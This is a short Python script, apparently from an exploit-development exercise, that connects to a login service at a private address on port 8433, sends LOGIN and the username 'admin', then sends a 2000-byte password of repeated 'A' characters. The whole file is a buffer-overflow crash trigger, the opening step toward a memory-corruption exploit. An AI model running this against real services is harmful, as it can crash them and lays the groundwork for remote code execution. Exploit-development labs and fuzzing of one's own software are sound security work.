#!/usr/bin/python

import socket,os,time,struct

host = "192.168.201.10"
port = 8433

login_buffer = b"LOGIN\r\n"
username_buffer = b"admin\r\n"
password_buffer = b"\x41" * 2000 + b"\r\n"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024))
s.send(login_buffer)
print(s.recv(1024))
s.send(username_buffer)
print(s.recv(1024))
s.send(password_buffer)
print(s.recv(1024))